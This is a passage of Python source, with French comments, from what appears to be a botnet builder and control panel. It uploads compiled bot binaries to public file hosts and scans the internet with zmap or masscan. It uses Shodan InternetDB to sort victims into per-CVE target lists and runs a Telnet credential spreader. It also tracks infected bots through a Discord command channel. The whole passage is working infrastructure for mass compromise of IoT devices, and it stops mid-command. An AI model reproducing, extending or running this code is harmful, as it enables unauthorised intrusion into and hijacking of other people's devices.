            # Serveur perso (heb.robbhabbo.online) — POST multipart → {"success":true,"url":"..."}
            if not self.cfg.self_host_url:
                return ''
            base = self.cfg.self_host_url.rstrip('/')
            out = _curl(['curl', '-s', '-F', f'file=@{f}', f'{base}/upload.php'])
            try:
                data = json.loads(out)
                if data.get('success') and data.get('url', '').startswith('http'):
                    return data['url']
            except Exception:
                pass
            return ''

        def upload_filebin(f: str) -> str:
            # filebin.net — POST body brut avec headers filename/bin
            import random, string
            binid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
            fname = Path(f).name
            out = _curl(['curl', '-s', '-X', 'POST',
                         '-H', 'Accept: application/json',
                         '-H', f'filename: {fname}',
                         '-H', f'bin: {binid}',
                         '--data-binary', f'@{f}',
                         f'https://filebin.net/{binid}/{fname}'])
            try:
                data = json.loads(out)
                fn  = data.get('file', {}).get('filename', fname)
                bid = data.get('bin', {}).get('id', binid)
                sz  = data.get('file', {}).get('bytes', 0)
                if sz == 0: return ''
                return f'https://filebin.net/{bid}/{fn}'
            except Exception:
                return ''

        hosts_names = {
            upload_selfhost:  self.cfg.self_host_url or 'selfhost',
            upload_catbox:    'catbox.moe',
            upload_litterbox: 'litterbox.catbox.moe',
            upload_filebin:   'filebin.net',
        }

        self_group = [upload_selfhost] if self.cfg.self_host_url else []
        # catbox primaire → litterbox (même infra 72h) → filebin fallback final
        chain        = self_group + [upload_catbox, upload_litterbox, upload_filebin]
        backup_chain = self_group + [upload_litterbox, upload_filebin, upload_catbox]

        chain_to_use = backup_chain if getattr(self, '_uploading_backup', False) else chain

        for attr, out_name in built_bots:
            cprint(f"  [*] Upload {out_name}...", C.YELLOW)
            url = ''
            for fn in chain_to_use:
                url = fn(out_name)
                if url:
                    cprint(f"  [+] {out_name} → {url}  ({hosts_names[fn]})", C.GREEN)
                    urls[attr] = url
                    break
                cprint(f"  [~] {hosts_names[fn]} échoué, essai suivant...", C.YELLOW)
            if not url:
                cprint(f"  [!] Tous les hébergeurs ont échoué pour {out_name}.", C.RED)
                manual = cinput(f"  URL manuelle pour {out_name} (vide = ignorer) : ", C.WHITE).strip()
                if manual: urls[attr] = manual
        return urls

    # ── Services ───────────────────────────────────────────────────────────────
    def services_menu(self):
        while True:
            clear(); print(BANNER)
            header("GÉRER LES SERVICES")
            fiber_run = self._screen_running('scanner_')
            scan = self.cfg.scan_ports or '23,80,8080'
            if self.cfg.distrib_mode == 'auto':
                cprint(f"\n  {C.BLUE}ℹ  Mode AUTO — binaires hébergés sur {self.cfg.upload_host}{C.RESET}")
            else:
                host = self.cfg.c2_host or '(non configuré)'
                port = self.cfg.c2_http_port or '80'
                cprint(f"\n  {C.BLUE}ℹ  Mode LOCAL — fiber sert les binaires sur {host}:{port}{C.RESET}")
            cprint(f"  {C.BLUE}   Scan victims port : {scan}{C.RESET}\n")
            telnet_run = self._screen_running('telnet_spread')
            tc = self.cfg.telnet_creds or ''
            item(1, f"Scanner Fiber (HTTP inclus)", "ACTIF" if fiber_run else "ARRÊTÉ")
            item(8, f"Spreader Telnet (creds file)", ("ACTIF" if telnet_run else "ARRÊTÉ") + (f" — {tc}" if tc else " — (no file)"))
            sep()
            item(2, "Démarrer fiber")
            item(3, "Arrêter fiber")
            item(4, "Arrêter TOUT")
            item(9, "Démarrer Telnet spreader")
            item('s', "Arrêter Telnet spreader")
            sep()
            item(5, "Voir scan en cours  (stats + logs)")
            item(6, "Bots infectés       (Discord)")
            item(7, "Vérifier config     (test HTTP + Discord)")
            item('r', "Télécharger listes Rapid7 (remplace all.lst)")
            sep()
            item(0, "Retour")
            sep()
            match cinput("\n  > Choix : ").strip():
                case '2': self._start_fiber()
                case '3': self._stop_fiber()
                case '4': self._stop_all()
                case '5': self._show_scan_log()
                case '6': self._show_bots()
                case '7': self._check_config()
                case '8': self._show_telnet_log()
                case '9': self._start_telnet_spread()
                case 's': self._stop_telnet_spread()
                case 'r': self._internetdb_enrich()
                case '0': return

    def _internetdb_enrich(self):
        """Enrichit les IPs trouvées par zmap via Shodan InternetDB.
        Gratuit, sans compte, sans API key — https://internetdb.shodan.io/{ip}
        Retourne : ports ouverts, tags (iot/router/cam), CPEs (modèle exact), CVEs connus.
        Génère des fichiers ciblés par CVE pour que fiber attaque le bon exploit.
        """
        import json as _json, urllib.request as _req, threading, queue as _queue

        clear(); print(BANNER)
        header("SHODAN INTERNETDB — Enrichissement IPs")
        cprint(f"\n  {C.BLUE}ℹ  internetdb.shodan.io — gratuit, sans compte, sans API key.{C.RESET}")
        cprint(f"  {C.BLUE}   Pour chaque IP trouvée par zmap : ports, device type, CVEs connus.{C.RESET}")
        cprint(f"  {C.BLUE}   Génère des listes ciblées par CVE → exploits précis dans fiber.\n{C.RESET}")

        # ── Collecte des IPs déjà trouvées par zmap ───────────────────────────
        ports = [p.strip() for p in (self.cfg.scan_ports or '23,80,8080,7547,2323').split(',') if p.strip()]
        all_ips: set[str] = set()
        for port in ports:
            f = Path(f"/tmp/found_{port}.txt")
            if f.exists():
                for line in f.read_text(errors='replace').splitlines():
                    ip = line.strip()
                    if ip: all_ips.add(ip)

        if not all_ips:
            cprint(f"  {C.YELLOW}[!] Aucune IP trouvée par zmap pour l'instant.{C.RESET}")
            cprint(f"  {C.CYAN}   Lance d'abord le scanner (Services → Démarrer fiber).{C.RESET}")
            # Permettre quand même de saisir une liste manuelle
            v = cinput("\n  > Saisir des IPs manuellement ? (ex: 1.2.3.4,5.6.7.8) [Entrée=non] : ", C.WHITE).strip()
            if not v: cinput("  > Entrée..."); return
            all_ips = {ip.strip() for ip in v.replace(' ','').split(',') if ip.strip()}

        cprint(f"  {C.GREEN}[+] {len(all_ips)} IP(s) à enrichir{C.RESET}")
        workers = min(20, len(all_ips))
        cprint(f"  {C.BLUE}ℹ  {workers} workers parallèles (gentle rate-limit automatique){C.RESET}\n")
        if cinput("  > Continuer ? [o/N] : ", C.WHITE).strip().lower() != 'o':
            return

        # ── Enrichissement via InternetDB ─────────────────────────────────────
        results: dict[str, dict] = {}
        ip_queue: _queue.Queue = _queue.Queue()
        for ip in all_ips: ip_queue.put(ip)
        lock = threading.Lock()
        done_count = [0]

        def worker():
            while True:
                try: ip = ip_queue.get_nowait()
                except _queue.Empty: return
                try:
                    req = _req.Request(
                        f"https://internetdb.shodan.io/{ip}",
                        headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
                    )
                    with _req.urlopen(req, timeout=8) as r:
                        data = _json.loads(r.read())
                    with lock:
                        results[ip] = data
                        done_count[0] += 1
                        pct = done_count[0] * 100 // len(all_ips)
                        print(f"\r  {C.CYAN}  {done_count[0]}/{len(all_ips)} ({pct}%){C.RESET}", end='', flush=True)
                except urllib.error.HTTPError as e:
                    if e.code == 404:  # IP inconnue de Shodan — pas grave
                        with lock: done_count[0] += 1
                except Exception:
                    with lock: done_count[0] += 1
                finally:
                    ip_queue.task_done()
                    time.sleep(0.05)  # gentle — 20 req/s max

        threads = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
        for t in threads: t.start()
        ip_queue.join()
        print()
        cprint(f"  {C.GREEN}[+] {len(results)} IPs enrichies (sur {len(all_ips)} total){C.RESET}\n")

        # ── Affichage résultats + écriture fichiers ciblés ────────────────────
        # Mapping CVE → fichier de sortie ciblé
        cve_map: dict[str, list[str]] = {}
        interesting: list[tuple[str, dict]] = []

        for ip, data in results.items():
            vulns  = data.get('vulns', []) or []
            cpes   = data.get('cpes', []) or []
            tags   = data.get('tags', []) or []
            dports = data.get('ports', []) or []
            if not vulns and 'iot' not in tags and 'router' not in tags: continue
            interesting.append((ip, data))
            for cve in vulns:
                cve_map.setdefault(cve, []).append(ip)

        # Affichage top 30
        cprint(f"  {C.YELLOW}── Appareils intéressants ({len(interesting)} trouvés) ──{C.RESET}")
        for ip, data in interesting[:30]:
            vulns  = data.get('vulns', []) or []
            cpes   = data.get('cpes',  []) or []
            tags   = data.get('tags',  []) or []
            dports = data.get('ports', []) or []
            tag_str = ','.join(tags[:3]) if tags else '?'
            cpe_str = cpes[0].split(':')[-1] if cpes else '?'
            vuln_str = f"{C.RED}{len(vulns)} CVEs{C.RESET}" if vulns else f"{C.YELLOW}0 CVE{C.RESET}"
            cprint(f"  {C.CYAN}{ip:<16}{C.RESET} ports={dports[:5]}  [{tag_str}]  {cpe_str}  {vuln_str}")
        if len(interesting) > 30:
            cprint(f"  {C.BLUE}  ... et {len(interesting)-30} autres{C.RESET}")

        # Top CVEs détectés
        if cve_map:
            cprint(f"\n  {C.YELLOW}── Top CVEs détectés ──{C.RESET}")
            for cve, ips in sorted(cve_map.items(), key=lambda x: -len(x[1]))[:15]:
                cprint(f"  {C.RED}{cve:<22}{C.RESET} → {len(ips)} appareil(s)")

        # ── Écriture fichiers ciblés ──────────────────────────────────────────
        if interesting:
            # all.lst enrichi (toutes les IPs intéressantes)
            enriched_ips = [ip for ip, _ in interesting]
            if Path('all.lst').exists():
                Path('all.lst').rename('all.lst.bak')
            Path('all.lst').write_text('\n'.join(enriched_ips) + '\n')
            cprint(f"\n  {C.GREEN}[+] all.lst mis à jour : {len(enriched_ips)} IPs avec CVEs/tags IoT{C.RESET}")

            # Fichiers par CVE (pour ciblage manuel ou fiber)
            out_dir = Path('/tmp/internetdb_cves')
            out_dir.mkdir(exist_ok=True)
            for cve, ips in cve_map.items():
                safe = cve.replace('/', '_')
                (out_dir / f"{safe}.lst").write_text('\n'.join(ips) + '\n')
            cprint(f"  {C.GREEN}[+] {len(cve_map)} fichiers CVE → {out_dir}/{C.RESET}")
            cprint(f"  {C.BLUE}ℹ  Ex: /tmp/internetdb_cves/CVE-2021-36260.lst = IPs Hikvision{C.RESET}")

        cprint(f"\n  {C.BLUE}ℹ  Lance le scanner : Services → Démarrer fiber (utilisera all.lst enrichi).{C.RESET}")
        cinput("\n  > Entrée...")

    def _screen_running(self, name: str) -> bool:
        if name == 'telnet_spread':
            # Vérifier le vrai processus fiber telnet, pas le screen
            r = subprocess.run(['pgrep', '-f', 'fiber telnet'],
                               capture_output=True, text=True)
            return r.returncode == 0
        # Pour les autres (scanner_*) : vérifier via screen -ls
        code, out = run(['screen', '-ls'], capture=True)
        for line in out.splitlines():
            if name in line and 'Dead' not in line and 'dead' not in line:
                return True
        return False

    def _show_scan_log(self):
        ports = [p.strip() for p in (self.cfg.scan_ports or '23,80,8080').split(',') if p.strip()]

        clear(); print(BANNER)
        header("STATS DES SCANNERS EN COURS")

        # ── Screens alternatifs actifs (InternetDB, import, masscan) ─────────
        code, screens_out = run(['screen', '-ls'], capture=True)
        alt_screens = []
        for line in screens_out.splitlines():
            for prefix in ('idb_', 'imp_'):
                import re as _re
                m = _re.search(rf'\d+\.({prefix}\S+)', line)
                if m and 'Dead' not in line and 'dead' not in line:
                    alt_screens.append(m.group(1))
        if alt_screens:
            cprint(f"\n  {C.YELLOW}── Screens alternatifs actifs ──{C.RESET}")
            for sname in alt_screens:
                # Deviner le port depuis le nom (idb_23 → 23)
                port_guess = sname.split('_')[-1]
                log_candidates = [
                    Path(f"/tmp/fiber_idb_{port_guess}.log"),
                    Path(f"/tmp/fiber_imp_{port_guess}.log"),
                    Path(f"/tmp/fiber_{port_guess}.log"),
                ]
                log_path = next((p for p in log_candidates if p.exists()), None)
                cprint(f"\n  {C.CYAN}● {sname}{C.RESET}  (screen -r {sname})")
                if log_path:
                    lines = log_path.read_text(errors='replace').splitlines()
                    for l in lines[-6:]:
                        color = C.GREEN if '[+]' in l or 'infect' in l.lower() \
                                else C.RED if '[!]' in l else C.WHITE
                        cprint(f"    {color}{l}{C.RESET}")
                else:
                    cprint(f"    {C.YELLOW}(pas encore de log){C.RESET}")
            sep()

        # Nombre total d'IPs dans all.lst
        lst_total = 0
        if Path('all.lst').exists():
            try:
                lst_total = sum(1 for _ in Path('all.lst').open())
            except Exception:
                pass

        any_found = False
        for port in ports:
            log_file     = Path(f"/tmp/fiber_{port}.log")
            found_file   = Path(f"/tmp/found_{port}.txt")
            current_file = Path(f"/tmp/current_{port}.txt")

            running = self._screen_running(f'scanner_{port}')
            status  = f"{C.GREEN}● ACTIF{C.RESET}" if running else f"{C.RED}● ARRÊTÉ{C.RESET}"
            cprint(f"\n  {C.YELLOW}── Port {port}  {status}{C.YELLOW} ──{C.RESET}")

            if not log_file.exists() and not found_file.exists():
                cprint(f"  {C.YELLOW}[i] Pas encore démarré{C.RESET}")
                continue

            any_found = True

            # IP actuellement scannée
            current_ip = '—'
            if current_file.exists():
                try: current_ip = current_file.read_text().strip() or '—'
                except Exception: pass

            # Nombre d'IPs actives trouvées
            active_count = 0
            if found_file.exists():
                try: active_count = sum(1 for _ in found_file.open())
                except Exception: pass

            # Ratio actif/total
            if lst_total > 0:
                pct = active_count / lst_total * 100
                ratio = f"{active_count:,} / {lst_total:,} ({pct:.3f}%)"
            else:
                ratio = f"{active_count:,}"

            cprint(f"  {C.CYAN}IP en cours     :{C.RESET} {C.WHITE}{current_ip}{C.RESET}")
            cprint(f"  {C.CYAN}IPs actives     :{C.RESET} {C.GREEN}{ratio}{C.RESET}")

            # Stats CVE extraites de la dernière ligne de stats du log
            if log_file.exists():
                lines = log_file.read_text(errors='replace').splitlines()
                # Cherche la dernière ligne de stats "[Xs] Attempted: ..."
                for l in reversed(lines):
                    if 'Attempted:' in l and 'CVE Hit:' in l:
                        import re
                        nums = re.findall(r'(\w[\w ]+):\s*(\d+)', l)
                        stats = {k.strip(): v for k, v in nums}
                        cprint(
                            f"  {C.CYAN}Stats           :{C.RESET} "
                            f"Tentées {C.WHITE}{stats.get('Attempted','?')}{C.RESET}  "
                            f"Found {C.GREEN}{stats.get('Found','?')}{C.RESET}  "
                            f"CVE Hit {C.YELLOW}{stats.get('CVE Hit','?')}{C.RESET}  "
                            f"CVE Work {C.MAGENTA}{stats.get('CVE Work','?')}{C.RESET}  "
                            f"Logins {C.BLUE}{stats.get('Logins','?')}{C.RESET}  "
                            f"Infected {C.RED}{stats.get('Infected','?')}{C.RESET}"
                        )
                        break
                cprint(f"  {C.CYAN}Dernières lignes:{C.RESET}")
                for l in lines[-8:]:
                    color = C.GREEN if any(k in l.lower() for k in ('[+]','success','infect','cve work')) \
                            else C.MAGENTA if 'cve hit' in l.lower() \
                            else C.RED if any(k in l.lower() for k in ('[!]','error','err')) \
                            else C.WHITE
                    cprint(f"    {color}{l}{C.RESET}")

        if not any_found:
            cprint(f"\n  {C.YELLOW}[i] Aucun scanner démarré. Lance depuis le menu Services.{C.RESET}")

        sep()
        cinput("  > Entrée...")

    def _show_bots(self):
        clear(); print(BANNER)
        header("BOTS INFECTÉS (Discord)")
        if not self.cfg.token or not self.cfg.channel_id:
            cprint("  [!] Token ou Channel ID non configuré.", C.RED)
            cinput("  > Entrée..."); return

        cprint("  [*] Récupération des messages Discord...", C.YELLOW)
        try:
            url = f"https://discord.com/api/v10/channels/{self.cfg.channel_id}/messages?limit=100"
            req = urllib.request.Request(url, headers={
                'Authorization': f'Bot {self.cfg.token}',
                'User-Agent': 'CatNetBuilder/1.0'
            })
            with urllib.request.urlopen(req, timeout=8) as resp:
                messages = json.loads(resp.read())
        except urllib.error.HTTPError as e:
            cprint(f"  [!] Erreur Discord API : {e.code} {e.reason}", C.RED)
            cinput("  > Entrée..."); return
        except Exception as e:
            cprint(f"  [!] Erreur : {e}", C.RED)
            cinput("  > Entrée..."); return

        # Parser les annonces 🟢 `[botID]` online
        bots: dict[str, str] = {}  # botID -> dernière ligne
        for msg in reversed(messages):
            content = msg.get('content', '')
            if '🟢' in content and 'online' in content:
                # Extraire le botID entre backticks
                try:
                    bid = content.split('`')[1].strip('[]')
                    bots[bid] = content
                except IndexError:
                    pass
            elif '🔴' in content or 'killed' in content.lower():
                try:
                    bid = content.split('`')[1].strip('[]')
                    bots.pop(bid, None)
                except IndexError:
                    pass

        if not bots:
            cprint("\n  [i] Aucun bot détecté dans les 100 derniers messages.", C.YELLOW)
        else:
            cprint(f"\n  {C.GREEN}[+] {len(bots)} bot(s) actif(s) :{C.RESET}\n")
            for i, (bid, line) in enumerate(bots.items(), 1):
                # Extraire arch/os et uid depuis la ligne
                info = line.split('—')[-1].strip() if '—' in line else ''
                cprint(f"  {C.CYAN}[{i:02d}]{C.RESET} {C.WHITE}{bid:<30}{C.RESET}  {C.BLUE}{info}{C.RESET}")
        sep()
        cinput("  > Entrée...")

    def _check_config(self):
        clear(); print(BANNER)
        header("VÉRIFICATION CONFIG")

        ok = True

        def check(label, passed, detail=''):
            nonlocal ok
            if passed:
                cprint(f"  {C.GREEN}[✓]{C.RESET} {label}" + (f"  {C.BLUE}{detail}{C.RESET}" if detail else ''))
            else:
                cprint(f"  {C.RED}[✗]{C.RESET} {label}" + (f"  {C.RED}{detail}{C.RESET}" if detail else ''))
                ok = False

        cprint(f"\n  {C.YELLOW}── Champs obligatoires ──{C.RESET}")
        check("Token Discord configuré",  bool(self.cfg.token))
        check("Channel ID configuré",     bool(self.cfg.channel_id))
        if self.cfg.distrib_mode == 'local':
            check("IP / domaine C2 configuré", bool(self.cfg.c2_host))

        cprint(f"\n  {C.YELLOW}── Outils système ──{C.RESET}")
        check("zmap installé",  bool(shutil.which('zmap')),  shutil.which('zmap') or 'apt install zmap')
        check("screen installé", bool(shutil.which('screen')), shutil.which('screen') or 'apt install screen')
        _go_path = '/usr/local/go/bin/go' if Path('/usr/local/go/bin/go').exists() else (shutil.which('go') or None)
        check("go installé",    bool(_go_path),    _go_path or 'apt install golang')
        # Droits sudo pour zmap
        r = subprocess.run(['sudo', '-n', 'true'], capture_output=True)
        check("sudo sans mot de passe (zmap)", r.returncode == 0, "zmap nécessite root")

        cprint(f"\n  {C.YELLOW}── Binaires locaux ──{C.RESET}")
        check("fiber compilé",  Path('fiber').exists())
        bots_built = [n for _, _, _, _, _, n in ARCHS if Path(n).exists()]
        bots_missing = [n for _, _, _, _, _, n in ARCHS
                        if getattr(self.cfg, [a for a, *_ in [t for t in ARCHS if t[5]==n]][0], False)
                        and not Path(n).exists()]
        check(f"Binaires bots ({len(bots_built)} présents)", len(bots_built) > 0,
              ', '.join(bots_built) if bots_built else 'aucun')
        if bots_missing:
            check(f"Bots sélectionnés manquants", False, ', '.join(bots_missing))

        cprint(f"\n  {C.YELLOW}── Distribution des binaires ──{C.RESET}")
        if self.cfg.distrib_mode == 'auto':
            cprint(f"  {C.BLUE}[i] Mode AUTO ({self.cfg.upload_host}) — URLs embedded dans fiber au build.{C.RESET}")
            # Vérifier que fiber existe et contient bien des URLs https://
            if Path('fiber').exists():
                r = subprocess.run(['strings', 'fiber'], capture_output=True, text=True)
                embedded = [l for l in r.stdout.splitlines() if l.startswith('http') and ('catbox' in l or 'transfer.sh' in l or '0x0' in l)]
                check("URLs hébergeur embedded dans fiber", bool(embedded),
                      f"{len(embedded)} URL(s) trouvée(s)" if embedded else "Rebuild nécessaire")
            else:
                check("fiber compilé", False, "introuvable")
        else:
            # Mode local — tester le serveur HTTP
            host = self.cfg.c2_host
            port = self.cfg.c2_http_port or '80'
            if host:
                base = f"http://{host}" + (f":{port}" if port != '80' else '')
                try:
                    req = urllib.request.Request(base + '/', method='HEAD')
                    req.add_header('User-Agent', 'CatNetChecker/1.0')
                    with urllib.request.urlopen(req, timeout=6) as r:
                        check(f"Serveur HTTP {base}/", True, f"HTTP {r.status}")
                except Exception as e:
                    check(f"Serveur HTTP {base}/", False, str(e)[:60])
                for attr, label, _, _, _, fname in ARCHS:
                    if not getattr(self.cfg, attr, False):
                        continue
                    url = f"{base}/{fname}"
                    try:
                        req = urllib.request.Request(url, method='HEAD')
                        req.add_header('User-Agent', 'CatNetChecker/1.0')
                        with urllib.request.urlopen(req, timeout=6) as r:
                            size = r.headers.get('Content-Length', '?')
                            check(f"{fname}", True, f"{int(size)//1024} KB" if size != '?' else 'OK')
                    except urllib.error.HTTPError as e:
                        check(f"{fname}", False, f"HTTP {e.code}")
                    except Exception as e:
                        check(f"{fname}", False, str(e)[:60])
            else:
                cprint(f"  {C.YELLOW}[!] IP/domaine non configuré — test HTTP ignoré{C.RESET}")

        cprint(f"\n  {C.YELLOW}── Discord API ──{C.RESET}")
        if self.cfg.token and self.cfg.channel_id:
            try:
                url = f"https://discord.com/api/v10/channels/{self.cfg.channel_id}"
                req = urllib.request.Request(url, headers={
                    'Authorization': f'Bot {self.cfg.token}',
                    'User-Agent': 'CatNetChecker/1.0'
                })
                with urllib.request.urlopen(req, timeout=6) as r:
                    data = json.loads(r.read())
                    check("Token valide + accès channel", True, f"#{data.get('name','?')}")
            except urllib.error.HTTPError as e:
                msg = {401: "Token invalide", 403: "Bot pas dans le serveur", 404: "Channel introuvable"}.get(e.code, str(e))
                check("Token valide + accès channel", False, msg)
            except Exception as e:
                check("Token valide + accès channel", False, str(e)[:60])
        else:
            cprint(f"  {C.YELLOW}[!] Token ou Channel ID manquant — test Discord ignoré{C.RESET}")

        sep()
        cprint(f"\n  {'  ' + C.GREEN + '✓ Tout OK !' if ok else '  ' + C.RED + '✗ Des problèmes détectés.'}{C.RESET}\n")
        cinput("  > Entrée...")

    def _internetdb_feed_fiber(self, ports: list[str], env_prefix: str):
        """Mode InternetDB pur : lit all.lst, enrichit via internetdb.shodan.io, pipe vers fiber.
        Évite zmap entièrement — idéal si zmap bloqué, pas root, ou VPS limité."""
        import json as _json, urllib.request as _req, threading, queue as _queue

        if not Path('all.lst').exists():
            cprint("  [!] all.lst introuvable — lance d'abord InternetDB (menu Services → [r]).", C.RED)
            return

        ips = [l.strip() for l in Path('all.lst').read_text(errors='replace').splitlines() if l.strip()]
        if not ips:
            cprint("  [!] all.lst vide.", C.RED); return

        cprint(f"  [i] InternetDB : enrichissement de {len(ips)} IPs...", C.BLUE)

        enriched: list[str] = []
        q: _queue.Queue = _queue.Queue()
        for ip in ips: q.put(ip)
        lock = threading.Lock()
        done = [0]

        def worker():
            while True:
                try: ip = q.get_nowait()
                except _queue.Empty: return
                keep = False
                try:
                    req = _req.Request(
                        f"https://internetdb.shodan.io/{ip}",
                        headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
                    )
                    with _req.urlopen(req, timeout=6) as r:
                        data = _json.loads(r.read())
                    tags  = data.get('tags', []) or []
                    vulns = data.get('vulns', []) or []
                    dports = data.get('ports', []) or []
                    # Garder si IoT/router/cam OU CVE connu OU port cible ouvert
                    target_ports = {int(p) for p in ports if p.isdigit()}
                    if tags or vulns or (target_ports & set(dports)):
                        keep = True
                except Exception:
                    keep = True  # pas de réponse = inconnu → on tente quand même
                with lock:
                    if keep: enriched.append(ip)
                    done[0] += 1
                    print(f"\r  {C.CYAN}  {done[0]}/{len(ips)} ({done[0]*100//len(ips)}%) — {len(enriched)} retenus{C.RESET}", end='', flush=True)
                q.task_done()
                time.sleep(0.05)

        threads = [threading.Thread(target=worker, daemon=True) for _ in range(20)]
        for t in threads: t.start()
        q.join()
        print()
        cprint(f"  [+] {len(enriched)} IPs retenues après enrichissement InternetDB", C.GREEN)

        if not enriched:
            cprint("  [!] Aucune IP retenue.", C.RED); return

        # Pipe les IPs vers fiber directement (une par une, sans zmap)
        for port in ports:
            log_file   = f"/tmp/fiber_idb_{port}.log"
            found_file = f"/tmp/found_{port}.txt"
            # Écrire les IPs dans found_file pour cohérence avec le reste
            Path(found_file).write_text('\n'.join(enriched) + '\n')
            fiber_cmd = f"{env_prefix}./fiber {port}"
            inner = (
                f"echo '[*] InternetDB→fiber port {port}' | tee {log_file}; "
                f"cat {found_file} | {fiber_cmd} 2>&1 | tee -a {log_file}; "
                f"echo '[*] Terminé.' >> {log_file}"
            )
            import subprocess
            subprocess.run(['screen', '-dmS', f'idb_{port}', 'bash', '-c', inner])
            cprint(f"  [+] idb_{port} démarré (screen -r idb_{port})", C.GREEN)

    def _start_fiber(self):
        if not Path('fiber').exists():
            cprint("  [!] fiber introuvable. Lance BUILD d'abord.", C.RED)
            cinput("  > Entrée..."); return

        ports = [p.strip() for p in (self.cfg.scan_ports or '23,80,8080').split(',') if p.strip()]

        # ── Choix de la source d'IPs ──────────────────────────────────────────
        clear(); print(BANNER)
        header("SOURCE D'IPs — Choix du mode")
        has_lst = Path('all.lst').exists()
        lst_count = sum(1 for _ in Path('all.lst').open()) if has_lst else 0
        lst_info  = f"({lst_count} IPs)" if has_lst else f"{C.RED}(absent){C.RESET}"
        has_masscan = bool(subprocess.run(['which','masscan'], capture_output=True).returncode == 0)
        masscan_tag = "" if has_masscan else f" {C.RED}[non installé]{C.RESET}"

        cprint(f"\n  {C.CYAN}[1]{C.RESET} zmap seul              — scan actif internet complet")
        cprint(f"  {C.CYAN}[2]{C.RESET} masscan seul{masscan_tag}       — plus rapide que zmap, même résultat")
        cprint(f"  {C.CYAN}[3]{C.RESET} zmap + masscan         — les deux en parallèle, couverture max")
        cprint(f"  {C.CYAN}[4]{C.RESET} InternetDB seul        — lit all.lst {lst_info}, enrichit sans scan")
        cprint(f"  {C.CYAN}[5]{C.RESET} zmap + InternetDB      — zmap découvre, InternetDB filtre")
        cprint(f"  {C.CYAN}[6]{C.RESET} masscan + InternetDB{masscan_tag} — masscan découvre, InternetDB filtre")
        cprint(f"  {C.CYAN}[7]{C.RESET} Plage CIDR manuelle    — scanner un réseau précis (ex: 1.2.3.0/24)")
        cprint(f"  {C.CYAN}[8]{C.RESET} Importer fichier IPs   — charger une liste externe → fiber direct")
        cprint(f"  {C.CYAN}[0]{C.RESET} Annuler\n")
        src_choice = cinput("  > Choix : ", C.WHITE).strip()
        if src_choice == '0' or not src_choice: return
        if src_choice not in ('1','2','3','4','5','6','7','8'):
            cprint("  [!] Choix invalide.", C.RED); cinput("  > Entrée..."); return

        # ── Paramètres spéciaux selon mode ───────────────────────────────────
        cidr_target = ''
        import_file = ''
        if src_choice == '7':
            cidr_target = cinput("  > CIDR (ex: 192.168.1.0/24, 45.0.0.0/8) : ", C.WHITE).strip()
            if not cidr_target: return
        if src_choice == '8':
            import_file = cinput("  > Chemin fichier IPs (une IP par ligne) : ", C.WHITE).strip()
            if not import_file or not Path(import_file).exists():
                cprint("  [!] Fichier introuvable.", C.RED); cinput("  > Entrée..."); return

        use_lst = '-w all.lst' if self.cfg.use_all_lst and has_lst and src_choice in ('1','2','3','5','6') else ''
        if cidr_target: use_lst = cidr_target  # CIDR remplace -w

        if self.cfg.distrib_mode == 'local':
            if not self.cfg.c2_host:
                cprint("  [!] Mode local : IP / domaine C2 non configuré. Va dans Configuration.", C.RED)
                cinput("  > Entrée..."); return
            http_port  = self.cfg.c2_http_port or "80"
            env_prefix = f"C2_IP={self.cfg.c2_host} HTTP_PORT={http_port} "
            cprint(f"  [i] Mode local — fiber sert sur {self.cfg.c2_host}:{http_port}", C.BLUE)
        else:
            env_prefix = ""
            cprint(f"  [i] Mode auto — URLs embedded dans fiber", C.BLUE)

        # ── Modes sans scan réseau (InternetDB pur, import fichier) ──────────
        if src_choice == '4':
            cprint(f"\n  [i] Mode InternetDB — sans scan", C.BLUE)
            self._internetdb_feed_fiber(ports, env_prefix)
            cprint(f"\n  [i] Screens actifs : screen -ls", C.CYAN)
            cprint(f"  [i] Attacher       : screen -r idb_<port>", C.CYAN)
            cinput("  > Entrée..."); return

        if src_choice == '8':
            ips_raw = [l.strip() for l in Path(import_file).read_text(errors='replace').splitlines() if l.strip()]
            cprint(f"  [i] {len(ips_raw)} IPs chargées depuis {import_file}", C.BLUE)
            for port in ports:
                found_file = f"/tmp/found_{port}.txt"
                log_file   = f"/tmp/fiber_imp_{port}.log"
                Path(found_file).write_text('\n'.join(ips_raw) + '\n')
                fiber_cmd = f"{env_prefix}./fiber {port}"
                inner = (
                    f"echo '[*] Import→fiber port {port}' | tee {log_file}; "
                    f"cat {found_file} | {fiber_cmd} 2>&1 | tee -a {log_file}; "
                    f"echo '[*] Terminé.' >> {log_file}"
                )
                subprocess.run(['screen', '-dmS', f'imp_{port}', 'bash', '-c', inner])
                cprint(f"  [+] imp_{port} démarré", C.GREEN)
            cprint(f"\n  [i] Screens actifs : screen -ls", C.CYAN)
            cinput("  > Entrée..."); return

        total_rate = self.cfg.scan_rate or 1000
        BATCH = 2
        rate_per_port = max(100, total_rate // BATCH)
        nb_vagues = (len(ports) + BATCH - 1) // BATCH

        cprint(f"  [i] Ports  : {', '.join(ports)}", C.BLUE)
        cprint(f"  [i] Vagues : {BATCH} ports à la fois → {rate_per_port} pps/port", C.BLUE)
        cprint(f"  [i] Total  : {nb_vagues} vague(s) enchaînées automatiquement", C.BLUE)
        mode_labels = {'1':'zmap','2':'masscan','3':'zmap+masscan','5':'zmap+InternetDB','6':'masscan+InternetDB','7':'CIDR'}
        cprint(f"  [i] Mode   : {mode_labels.get(src_choice,'?')}", C.BLUE)
        print()

        def make_inner(port):
            log_file     = f"/tmp/fiber_{port}.log"
            found_file   = f"/tmp/found_{port}.txt"
            current_file = f"/tmp/current_{port}.txt"
            fiber_cmd    = f"{env_prefix}./fiber {port}"

            # ── Commandes de scan selon la source ────────────────────────────
            target = cidr_target if cidr_target else ''
            zmap_cmd     = f"sudo zmap -p{port} {use_lst if not cidr_target else target} --rate={rate_per_port} -q".strip()
            masscan_cmd  = f"sudo masscan -p{port} {target or '0.0.0.0/0'} --rate={rate_per_port} --excludefile=/etc/masscan/exclude.conf 2>/dev/null | awk '{{print $6}}'".strip()

            # Filtre InternetDB inline bash (pour modes 5 et 6)
            idb_filter = (
                "while IFS= read -r ip; do "
                "  r=$(curl -sf --max-time 4 \"https://internetdb.shodan.io/$ip\" 2>/dev/null); "
                "  if [ -z \"$r\" ] || echo \"$r\" | grep -qE '\"tags\"|\"vulns\"'; then "
                f"    echo \"$ip\" > {current_file}; "
                f"    echo \"$ip\" >> {found_file}; "
                "    echo \"$ip\"; "
